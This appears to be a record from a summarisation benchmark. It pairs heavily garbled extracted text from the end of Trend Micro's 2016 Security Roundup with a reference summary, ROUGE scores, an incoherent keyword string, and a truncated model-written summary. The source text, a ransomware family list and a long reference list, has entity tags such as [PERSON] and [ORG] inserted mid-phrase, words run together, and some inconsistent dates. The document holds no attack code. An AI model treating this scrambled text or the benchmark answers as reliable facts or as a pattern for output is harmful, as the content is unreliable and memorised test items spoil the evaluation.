2.0PRINCESSLOCKERDXXDEDA2JANBLEED\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u202235 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsHADESLOCKHIDDENTEARAPTKOSTYAHIDDENTEARSHADOWENIGMACRYPTBTNEDA2BLAZEROCRYPTCRYPHYDRAPSHELLCRYSIS 2.0CRYPSHEDSPICYCRYPTVINDOWSHOTDEMPROTOBTCCITOXEPCLOCKHIDDENTEARGUSTERSEOIRSEANTIXGOLDENEYEPOPCORNTYMMIRCOPDatabase WebsiteSQLTaxCADVD\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022Table 7 . Business - related files encrypted by known ransomware families , [DATE] 201636 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year [DATE] for [DATE] Enterprise ThreatsReferences1 . [PERSON] Maria [PERSON] Korolov . ( [DATE] 5 [DATE] January [DATE] 2017 ) . CSO Online . \u201c Ransomware took in $ [MONEY] 1 [MONEY] billion in [DATE] 2016 \u2014 improved defenses may not be enough to stem the tide . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url [QUANTITY] billion - in-2016 - improved - defenses - may - not - be - enough - to - stem - the - tide.html2 . [PERSON] Mary [PERSON] Yambao and [PERSON] Francis [PERSON] Antazo . ( [DATE] 22 [DATE] November [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201cBusinesses as [ORG] Ransomware \u2019s [ORG] Goldmine : How Cerber Encrypts Database Files . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url security - intelligence / how - cerber - encrypts - database - files/3 . [PERSON] Thomas Fox - Brewster . ( [DATE] 28 [DATE] November [DATE] 2016 ) . [PERSON] Forbes . \u201c Ransomware Crooks Demand $ [MONEY] 70,000 After [ORG] Hacking [ORG] San [ORG] Francisco [ORG] Transport [ORG] System \u2013 UPDATED . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url san - francisco - muni - hacked - ransomware/#5f51e76f54dd4 . [PERSON] Kat [PERSON] Hall . ( [DATE] 29 [DATE] September [DATE] 2016 ) . The [ORG] Register . \u201c [ORG] VESK [ORG] Coughs Up \u00a3 [DATE] 18k in [PERSON] Ransomware [PERSON] Attack . \u201d Last accessed on [DATE] 17 [DATE] January 2017,url [PERSON] Davis . ( [DATE] 5 [DATE] October [DATE] 2016 ) . [ORG] Healthcare [ORG] IT [ORG] News . \u201c [CARDINAL] Two Providers Forced to Pay Up in Ransomware Attacks . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url [PERSON] Francis [PERSON] Antazo , [PERSON] Byron [PERSON] Gelera , [PERSON] Jeanne [PERSON] Jocson , [PERSON] Ardin [PERSON] Maglalang , and [PERSON] Mary [PERSON] Yambao . ( [DATE] 25 [DATE] August [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201cNew Open Source Ransomware Based on Hidden Tear and EDA2 May Target Businesses . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url tear - and - eda2 - may - target - businesses/7 . [ORG] Trend [ORG] Micro . ( [DATE] 7 [DATE] September [DATE] 2016 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201cRansomware as a Service Offered in the Deep Web : What This Means for Enterprises . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url digital - threats / ransomware - as - a - service - what - this - means - for - enterprises8 . [ORG] Trend [ORG] Micro . ( [DATE] 9 [DATE] June [DATE] 2016 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201cBillion - Dollar Scams : The Numbers Behind Business Email Compromise . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url dollar - scams - the - numbers - behind - business - email - compromise9.Leoni [ORG] AG . ( [DATE] 16 [DATE] August [DATE] 2016 ) . Leoni . \u201c [WORK_OF_ART] Leoni [WORK_OF_ART] Targeted by Criminals . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url press / releases / details / leoni - targeted - by - criminals/10 . [ORG] Trend [ORG] Micro . ( [DATE] 25 [DATE] August [DATE] 2016 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201cBrisbane Council Loses [CARDINAL] 450 K AUD to [ORG] BEC [ORG] Scam . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url 450k - aud - to - bec - scam11 . [ORG] Trend [ORG] Micro . ( [DATE] 21 [DATE] September [DATE] 2016 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c$6 M Lost in [ORG] Another [ORG] BEC [ORG] Scam : Who Is the Weakest Link ? . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url in - another - bec - scam - who - is - the - weakest - link12 . [PERSON] Ryan [PERSON] Flores . ( [DATE] 23 [DATE] November [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201cCEO [ORG] Fraud [ORG] Email [ORG] Scams [ORG] Target [ORG] Healthcare [ORG] Institutions . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url healthcare - institutions/13 . DL Cade . ( [DATE] 17 [DATE] August [DATE] 2017 ) . [ORG] PetaPixel . \u201c All the Major Browsers Will Soon Block Flash , is Your Website Ready ? . \u201d Last accessed [DATE] 18January [DATE] 2017 , url [PERSON] Jonathan [PERSON] Leopando . ( [DATE] 27 [DATE] October [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Patch [WORK_OF_ART] Your [WORK_OF_ART] Flash : Another Zero - Day Vulnerability Hits Adobe Flash . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url another - [CARDINAL] zero - day - vulnerability - hits - adobe - flash/37 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise Threats15 . [PERSON] Feike [PERSON] Hacquebord and [PERSON] Stephen [PERSON] Hilt . ( [DATE] 9 [DATE] November [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201cPawn [PERSON] Storm [PERSON] Ramps [PERSON] Up Spear- phishing Before Zero - Days Get Patched . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url intelligence / pawn - storm - ramps - up - spear - phishing - before - zero - days - get - patched/16 . [PERSON] Brian [PERSON] Krebs . ( [DATE] 11 [DATE] October [DATE] 2016 ) . [ORG] Krebs [ORG] on [ORG] Security . \u201c Microsoft : No More Pick - and - Choose Patching . \u201d Last accessed [CARDINAL] 17 January2017 , url [ORG] Trend [ORG] Micro . ( [DATE] 31 [DATE] October [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [PERSON] Masque [PERSON] Attack Abuses iOS \u2019s Code Signing to Spoof Apps and Bypass Privacy Protection . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url ios - masque - attack - spoof - apps - bypass - privacy - protection/18 . [ORG] Trend [ORG] Micro . ( 6 October 201 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] First [WORK_OF_ART] Malware - Driven [WORK_OF_ART] Power [WORK_OF_ART] Outage [WORK_OF_ART] Reported in [GPE] Ukraine . \u201d Last accessed on [DATE] 1 [DATE] February [DATE] 2017 , url outage - reported - in - ukraine19 . [ORG] Echo [ORG] Duan . ( [DATE] 29 [DATE] September [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201cDressCode and its [ORG] Potential [ORG] Impact [ORG] for [ORG] Enterprises . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url enterprises/20 . [PERSON] Dan [PERSON] Goodin . ( [DATE] 10 [DATE] December [DATE] 2014 ) . [GPE] arsTechnica . \u201c [PERSON] PoC [PERSON] Hack on Data Sent Between Phones and [PERSON] Smartwatches ( Updated ) . \u201d Last accessed on [DATE] 23 [DATE] January [DATE] 2017 , url open - to - brute - force - hacks/21 . [PERSON] Darren [PERSON] Pauli . ( [DATE] 10 [DATE] November [DATE] 2016 ) . The [ORG] Register . \u201c [WORK_OF_ART] IoT [WORK_OF_ART] Worm [WORK_OF_ART] Can [WORK_OF_ART] Hack [WORK_OF_ART] Philips [WORK_OF_ART] Hue [WORK_OF_ART] Lightbulbs , [PERSON] Spread [PERSON] Across [PERSON] Cities . \u201d Last accessed on [DATE] 23 [DATE] January [DATE] 2017 , url across_cities/22 . [PERSON] Kyle [PERSON] York . ( [DATE] 22 [DATE] October [DATE] 2016 ) . [PERSON] Dyn . \u201c Dyn Statement on [DATE] 10/21/2016 DDoS Attack . \u201d Last accessed on [DATE] 23 [DATE] January [DATE] 2017 , url [PERSON] David [PERSON] Bisson . ( [DATE] 27 [DATE] October [DATE] 2016 ) . Tripwire . \u201c [CARDINAL] 100,000 [ORG] Bots [ORG] Infected with Mirai Malware Behind Dyn DDoS Attack . \u201d Last accessed on [DATE] 18 [DATE] January [DATE] 2017 , url caused - dyn - ddos - attack/24 . [ORG] Echo [ORG] Duan . ( [DATE] 13 [DATE] June [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c FLocker Mobile Ransomware Crosses to [ORG] Smart [ORG] TV . \u201d Last accessed on [DATE] 23 [DATE] January [DATE] 2017 , url [PRODUCT] Janita . ( [DATE] 7 [DATE] November [DATE] 2016 ) . [PERSON] Metropolitan.fi . \u201c DDoS Attack Halts Heating in [GPE] Finland Amidst Winter . \u201d Last accessed on [CARDINAL] 23 January2017 , url [ORG] WXYZ . ( [DATE] 18 [DATE] November [DATE] 2016 ) . WXYZ . \u201c [ORG] Michigan [ORG] State [ORG] University [ORG] Confirms [ORG] Data [ORG] Breach [ORG] of [ORG] Server [ORG] Containing [CARDINAL] 400,000 Student , [ORG] Staff [ORG] Records . \u201d Last accessed on [DATE] 18 [DATE] January [DATE] 2017 , url server - containing-400000 - student - staff - records27 . [PERSON] Bob [PERSON] Young . ( [DATE] 21 [DATE] December [DATE] 2016 ) . [ORG] The [ORG] Seattle [ORG] Times . \u201c [WORK_OF_ART] Data [WORK_OF_ART] Breach [WORK_OF_ART] Exposes [WORK_OF_ART] Info for [CARDINAL] 400,000 Community Health Plan Members . \u201d Last accessed on [DATE] 18 [DATE] January [DATE] 2017 , url community - health - plan - members/28 . [ORG] Trend [ORG] Micro . ( [DATE] 15 [DATE] December [DATE] 2016 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201cYahoo Discloses [DATE] 2013 Breach that Exposed Over One Billion Accounts . \u201d Last accessed on [DATE] 18 [DATE] January [DATE] 2017 , url [DATE] discloses-2013 - breach - exposed - over-1billion - accounts29 . [PERSON] Mathew [PERSON] Schwartz ( [DATE] 20 [DATE] January [DATE] 2017 ) . [ORG] Information [ORG] Security [ORG] Media [ORG] Group , Corp. \u201c Report : [GPE] US Data [PERSON] Breaches [PERSON] Reach [PERSON] Record [PERSON] Levels . \u201d Last accessed on [DATE] 6 [DATE] February [DATE] 2017 , url [PERSON] Andrew [PERSON] Osborn . ( [DATE] 1 [DATE] June [DATE] 2016 ) . [ORG] Reuters . \u201c [GPE] Russia Says Arrests [PERSON] Hacker [PERSON] Gang Who Defrauded Banks of Millions . \u201d Last accessed [ORG] on18 [DATE] January [DATE] 2017 , url | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise Threats31 . [PERSON] Kawabata [PERSON] Kohei . ( [DATE] 20 [DATE] July [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c CrypMIC Ransomware Wants to [PERSON] Follow CryptXXX \u2019s [PERSON] Footsteps . \u201d Last accessed on [DATE] 18 [DATE] January [DATE] 2017 , url wants - to - follow - cryptxxx/32 . [PERSON] Kafeine . ( [DATE] 2 [DATE] October [DATE] 2016 ) . [PERSON] Malware Do n\u2019t Need Coffee . \u201c RIG Evolves , [PERSON] Neutrino [PERSON] Waves [PERSON] Goodbye , [PERSON] Empire [PERSON] Pack [PERSON] Appears . \u201d Lastaccessed on [DATE] 18 [DATE] January [DATE] 2017 , url [ORG] Trend [ORG] Micro . ( [DATE] 18 [DATE] October [DATE] 2016 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Ransomware Recap : [DATE] Oct. [DATE] 14 , [DATE] 2016 . \u201d Last accessed on [CARDINAL] 18 January2017 , url [ORG] Trend [ORG] Micro . ( [DATE] 4 [DATE] October [DATE] 2016 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Ransomware Recap : [DATE] Sept. 30 , [DATE] 2016 . \u201d Last accessed on [DATE] January [DATE] 18,2017 , url [PERSON] Kawabata [PERSON] Kohei , [PERSON] Joseph [PERSON] C. [PERSON] Chen , and [PERSON] Jeanne [PERSON] Jocson . ( [DATE] 9 [DATE] September [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] Picture [WORK_OF_ART] Perfect : [ORG] CryLocker Ransomware Uploads User Information as [ORG] PNG [ORG] Files . \u201d Last accessed on [DATE] 18 [DATE] January [DATE] 2017 , url com / trendlabs - security - intelligence / picture - perfect - crylocker - ransomware - sends - user - information - as - png - files/36 . [PERSON] Brooks [PERSON] Li and [PERSON] Joseph [PERSON] C. [PERSON] Chen . ( [DATE] 4 [DATE] November [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c New Bizarro Sundown Exploit [PERSON] Kit [PERSON] Spreads Locky . \u201d Last accessed on [DATE] 18 [DATE] January [DATE] 2017 , url sundown - exploit - kit - spreads - locky/37 . [PERSON] Brooks [PERSON] Li and [PERSON] Joseph [PERSON] C. [PERSON] Chen . ( [DATE] 29 [DATE] December [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Updated [PERSON] Sundown [PERSON] Exploit Kit Uses Steganography . \u201d Last accessed on [DATE] 18 [DATE] January [DATE] 2017 , url sundown - exploit - kit - uses - steganography/38 . [PERSON] Joseph [PERSON] C. [PERSON] Chen ( [DATE] 12 [DATE] October [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Several Exploit Kits Now Deliver Cerber 4.0 . \u201d Last accessed on [DATE] 18 [DATE] January [DATE] 2017 , url cerber-4 - 0/39 . [ORG] Trend [ORG] Micro . ( [DATE] 20 [DATE] May [DATE] 2016 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c Skimer [ORG] ATM [ORG] Malware Gets Updated , Turns ATMs into [ORG] Skimming [ORG] Machines . \u201d Last accessed on [DATE] 19 [DATE] January [DATE] 2017 , url threats / skimer - atm - malware - updated - turns - atm - into - skimmer40 . [PERSON] David [PERSON] Sancho and [PERSON] Numaan [PERSON] Huq . ( [DATE] 12 [DATE] April [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c [WORK_OF_ART] ATM [WORK_OF_ART] Malware on the Rise . \u201d Last accessedon [DATE] 19 [DATE] January [DATE] 2017 , url [PERSON] Dave [PERSON] Massy . ( [DATE] 17 [DATE] February [DATE] 2014 ) . [ORG] Microsoft [ORG] Developer [ORG] Network . \u201c What Does the End of Support of Windows XP Mean for Windows Embedded ? \u201d Last accessed on [DATE] 23 [DATE] February [DATE] 2017 on , url does - the - end - of - support - of - windows - xp - mean - for - windows - embedded/42 . [PERSON] David [PERSON] Sancho and [PERSON] Numaan [PERSON] Huq . ( [DATE] 20 [DATE] December [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c Alice : A Lightweight , Compact , No - Nonsense [ORG] ATM [ORG] Malware . \u201d Last accessed on [DATE] 19 [DATE] January [DATE] 2017 , url alice - lightweight - compact - no - nonsense - atm - malware/43 . [ORG] Cklaudioney [ORG] Mesa and [PERSON] Christopher [PERSON] Ordonez . ( [DATE] 18 [DATE] February [DATE] 2016 ) . [ORG] TrendLabs [ORG] Security [PERSON] Intelligence [PERSON] Blog . \u201c QAKBOT Resurges : Despite Takedowns , Online Banking Threats Persist . \u201d Last accessed on [DATE] 19 [DATE] January [DATE] 2017 , url security - intelligence / despite - arrests - and - takedowns - online - banking - threats - persist/44 . SecurityWeek . ( [DATE] 27 [DATE] August [DATE] 2016 ) . SecurityWeek . \u201c [WORK_OF_ART] Ramnit [WORK_OF_ART] Banking [WORK_OF_ART] Trojan [WORK_OF_ART] Resumes [WORK_OF_ART] Activity . \u201d Last accessed on [DATE] 19 [DATE] January 2017,url [PERSON] Brian [PERSON] Prince . ( [DATE] 25 [DATE] January [DATE] 2015 ) . SecurityWeek . \u201c [PERSON] Ramnit [PERSON] Botnet [PERSON] Brought [PERSON] Down in Joint Operation by Police , Security Researchers . \u201d Last accessed on [DATE] 19 [DATE] January [DATE] 2017 , url [PERSON] researchers46 . [PERSON] Limor [PERSON] Kessem . ( [DATE] 26 [DATE] August [DATE] 2016 ) . SecurityIntelligence . \u201c Ramnit Rears Its Ugly Head Again , Targets Major [GPE] UK Banks . \u201d Lastaccessed on [DATE] 19 [DATE] January [DATE] 2017 , url [PERSON] Kayla [PERSON] Thrailkill . ( [DATE] 13 [DATE] September [DATE] 2016 ) . PC Pitstop TechTalk . \u201c University Gastroenterology Informs Patients of Data SecurityIncident . \u201d Last accessed on [DATE] 20 [DATE] February [DATE] 2017 , url | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise Threats48.Ian Richardson . ( [DATE] 2 [DATE] August [DATE] 2016 ) . [ORG] Sioux [ORG] City [ORG] Journal . \u201c [WORK_OF_ART] Supervisors [WORK_OF_ART] Approve investigation into [PERSON] Cyber [PERSON] Attack that Compromised [CARDINAL] 3,700 County Files . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url into - cyber - attack - that - compromised - county - files / article_6273cb18 - 7704 - 5803 - bd66 - c88a9931a4d0.html49 . [PERSON] Kaitlyn [PERSON] Schwers . ( [DATE] 16 [DATE] November , [DATE] 2016 ) . [ORG] Belleville [ORG] News - [ORG] Democrat . \u201c Unionized Grocery Workers May be Victimized by [ORG] ComputerHack . \u201d Last accessed on [DATE] February [DATE] 20 [DATE] 2017 , url [PERSON] Jessica [PERSON] Davis . ( [DATE] 5 [DATE] October , [DATE] 2016 ) . [ORG] Healthcare [ORG] IT [ORG] News . \u201c [CARDINAL] Two Providers Forced to Pay Up in Ransomware Attacks . \u201d Last accessedon [DATE] 20 [DATE] February [DATE] 2017 , url [PERSON] Akanksha [PERSON] Jayanthi . ( [DATE] 4 [DATE] October , [DATE] 2016 ) . Beckers [ORG] \u2019 [ORG] Hospital [ORG] Review . \u201c [ORG] New [ORG] Jersey [ORG] Spine [ORG] Center [ORG] Pays [ORG] Ransom to Cyberattackers After \u2018 Seeing No Other Option \u2019 . \u201d Last accessed on [DATE] 20 [DATE] February [DATE] 2017 , url technology / new - jersey - spine - center - pays - ransom - to - cyberattackers - after - seeing - no - other - option.html52 . Bobeth Yates . ( [DATE] 20 [DATE] August [DATE] 2016 ) . [PRODUCT] ABC [PRODUCT] 7 MySuncoast . \u201c City of Sarasota \u2019s System Hacked by [ORG] Ransomware , [ORG] Data [ORG] Held [ORG] Hostage . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url data - held / article_706019e2 - 6635 - 11e6 - 94cc - af3af2bb01f1.html53 . [PERSON] Daniel [PERSON] Tyson . ( [DATE] 27 [DATE] August [DATE] 2016 ) . TheRegister-Herald.com . \u201c [WORK_OF_ART] ARH [WORK_OF_ART] Bomputers [WORK_OF_ART] Breached . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url [ORG] Kobe [ORG] University . ( [DATE] 7 [DATE] September [DATE] 2016 ) . [ORG] Kobe [ORG] University . \u201c On [ORG] the [ORG] Computer [ORG] Virus [ORG] Infection [ORG] of [ORG] Our [ORG] Professional [ORG] Computer . \u201d Lastaccessed on [DATE] 17 [DATE] January [DATE] 2017 , url Amy Dalrymple . ( [DATE] 12 [DATE] September [DATE] 2016 ) . [ORG] Grand [ORG] Forks [ORG] Herald . \u201c [ORG] ND [ORG] Department Attacked by Ransomware . \u201d Last accessed on [DATE] 17January [DATE] 2017 , url [PERSON] Monica [PERSON] Vaughan . ( [DATE] 12 [DATE] September [DATE] 2016 ) . Appeal [NORP] Democrat . \u201c [PERSON] Ransomware [PERSON] Attack [PERSON] Hits Yuba City Clinic . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url 8506 - 5f7d1b5d1d53.html57 . [PERSON] Nicole [PERSON] Young . ( [DATE] 20 [DATE] September [DATE] 2016 ) . The [NORP] Tennessean . \u201c [FAC] Springfield [FAC] City [FAC] Hall [FAC] Recovers From [PERSON] Ransomware [PERSON] Attack . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url ransomware - attack/90746176/58 . [PERSON] Rodney [PERSON] Hanners . ( [DATE] 20 [DATE] September [DATE] 2016 ) . [PERSON] Keck [PERSON] Medicine . \u201c [ORG] Notice [ORG] of [ORG] Data [ORG] Breach . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url [ORG] KRGV . ( [DATE] 22 [DATE] September [DATE] 2016 ) . [PERSON] KRGV.com . \u201c [ORG] Palmhurst [ORG] Police [ORG] Department [ORG] Avoids [ORG] Data Loss . \u201d Last accessed on [DATE] 17 [DATE] January 2017,url [PERSON] Jessica [PERSON] Davis . ( [DATE] 4 [DATE] October [DATE] 2016 ) . [ORG] Healthcare [ORG] IT [ORG] News . \u201c [PERSON] Ransomware [PERSON] Attack on [ORG] Urgent [ORG] Care [ORG] Clinic of [ORG] Oxford , Purportedly [PERSON] Causedby [PERSON] Russian [PERSON] Hackers . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url [ORG] Dissent . ( [DATE] 17 [DATE] October [DATE] 2016 ) . DataBreaches.net . \u201c [ORG] Rainbow Children \u2019s [ORG] Clinic [ORG] Notifies [ORG] 33,368 Patients of [PERSON] Ransomware [PERSON] Attack . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url attack/62 . [PERSON] Abe [PERSON] Hawken . ( [DATE] 31 [DATE] October [DATE] 2016 ) . [ORG] Daily [ORG] Mail . \u201c [ORG] NHS [ORG] Trust [ORG] Cancels [ORG] EVERY [ORG] Operation at Three Hospitals After its Electronic System Was Hit by a Computer Virus Attack . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url Trust - cancels - operation - three - hospitals - electronic - hit - computer - virus - attack.html63 . [PERSON] Lynn [PERSON] Brezosky . ( [DATE] 11 [DATE] November [DATE] 2016 ) . [ORG] San [ORG] Antonio Express - [ORG] News . \u201c Ransomware Attack Targets Seguin Dermatology Practice . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url [ORG] dermatology-10609268.php64 . [PERSON] Brittany [PERSON] Seemuth . ( [DATE] 10 [DATE] November [DATE] 2016 ) . [ORG] Northwest [ORG] Now . \u201c Cyber Ransoming Hits [PERSON] Menomonee [PERSON] Falls Businesses . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url menomonee - falls - businesses/93548816/40 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise Threats65 . [PERSON] Herald [PERSON] Bulletin . ( [DATE] 15 [DATE] November [DATE] 2016 ) . [ORG] Indiana [ORG] Economic [ORG] Digest . \u201c [PERSON] EDITORIAL : [ORG] Madison [ORG] County [ORG] Hacker [ORG] Attack Will Cost More Than Ransom Payment . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url ID=201&articleID=8594966 . [PERSON] Kayla [PERSON] Thrailkill . ( [DATE] 18 [DATE] Novemeber [DATE] 2016 ) . PC [ORG] Pitstop [ORG] Tech [ORG] Talk . \u201c Spencer Chamber of Commerce Infected With Ransomware . \u201d Lastaccessed on [DATE] 17 [DATE] January [DATE] 2017 , url [ORG] Associated [ORG] Press . ( [DATE] 24 [DATE] November [DATE] 2016 ) . [PERSON] Billings [PERSON] Gazette . \u201c [PERSON] Ransomware [PERSON] Attack on Bigfork Schools ; Fix in [GPE] Works . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url works / article_7ff38855 - e5a1 - 59d8 - 84de-18869e1c0df6.html68 . [PERSON] Devin [PERSON] Zimmerman . ( [DATE] 29 [DATE] November [DATE] 2016 ) . kokomoperspective . \u201c Ransomware Targets Howard County Government . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url article_9a6d8640 - b5bb-11e6 - 854b - ff832671083f.html69 . [PERSON] Matthew [PERSON] Braga . ( [DATE] 29 [DATE] November [DATE] 2016 ) . [ORG] CBC [ORG] News . \u201c [ORG] Carleton [ORG] University [ORG] Computers [ORG] Infected with Ransomware . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url [PERSON] Erin [PERSON] Allen . ( [DATE] 8 [DATE] December [DATE] 2016 ) . PC [ORG] Pitstop [ORG] Tech [ORG] Talk . \u201c [GPE] Henry [GPE] County Hit with Ransomware , Leaving [CARDINAL] 18,000 Voters as [NORP] Victims . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url victims/71 . [PERSON] Erin [PERSON] Allen . ( [DATE] 14 [DATE] December [DATE] 2016 ) . PC [ORG] Pitstop [ORG] Tech [ORG] Talk . \u201c Ransomware Strikes [ORG] Arkansas Sheriff \u2019s [ORG] Office . \u201d Last accessed on [DATE] 17January [DATE] 2017 , url [PERSON] Joseph [PERSON] Goedert . ( [DATE] 22 [DATE] December [DATE] 2016 ) . [ORG] Information [ORG] Management . \u201c [ORG] California [ORG] Health [ORG] Center [ORG] Ransomware [ORG] Attack [ORG] Affects [CARDINAL] 65,000 . \u201d Last accessed on [DATE] 17 [DATE] January [DATE] 2017 , url ransomware - attack - affects-65000 - 10030545 - 1.html41 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise Threats", "generated_text": "2016; cybersecurity; enterprises; ransomware; 752%; 247; the number; 29; 247; 2016; over 200; BEC; data breaches; a number; companies; financial security; the Mirai botnet; Office; PowerPoint; PowerShell; control; a new family; a money-making scheme; C2; a response; a ransom note; data; a bank; bank fraud; bank accounts; cybercriminals; the numbers; PHYSICAL LOGIN; a ransom note; Assault; a Bank; EMPLOYMENT; the threat actors; Microsoft; INTERESTS; Security.", "ref_text": "<START-1>Ransomware spiked dramatically in 2016, with over 200 new families detected - a 752% increase from 2015. Many targeted business files like databases, servers, and virtual desktops. Open source ransomware and Ransomware-as-a-Service fueled growth. Business Email Compromise (BEC) scams caused major losses across 92 countries. Scams impersonating executives ramped up late in the year, targeting healthcare and other sectors. Vulnerabilities discovered in 2016 exceeded 700, a new record high. Adobe Reader and Advantech's WebAccess had the most. Flash vulnerabilities declined as it is phased out. The Mirai botnet highlighted risks of insecure IoT devices. It hijacked over 100,000 devices to launch massive DDoS attacks, disrupting major sites. The Yahoo breach exposed over 1 billion accounts, emphasizing issues of responsible disclosure and securing user data. Exploit kits declined after law enforcement actions, but new kits emerged. Angler disappeared while Neutrino and Rig distributed ransomware. Banking trojans and ATM malware persisted, evolving to target financial sectors. Old malware like RAMNIT resurfaced to attack banks. In total, over 80 billion threats were blocked in 2016, a 56% increase from 2015, indicating an expanding threat landscape. Email threats grew significantly. In summary, the report highlights key trends of ransomware growth, financial malware, vulnerabilities, data breaches, and an expanding threat landscape that demands improved security. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.38176638176638183, "gpt3/lexical/rouge_rouge2": 0.10888252148997134, "gpt3/lexical/rouge_rougeL": 0.20512820512820512, "gpt3/lexical/rouge_rougeLsum": 0.20512820512820512, "gpt3_generated_text": ["The article discusses the cybersecurity trends and threats faced by enterprises in 2016. Ransomware attacks saw a significant increase, with the number of new ransomware families jumping from 29 to 247, marking a 752% increase compared to the previous year. Ransomware proved to be a lucrative money-making scheme, with cybercriminals reportedly making about $1 billion in 2016. Many organizations chose to pay the ransom to have their data decrypted and restored, despite the risks. The article also highlights the rise of business email compromise (BEC) scams, the vulnerabilities in widely used platforms like Adobe Acrobat Reader and Advantech's 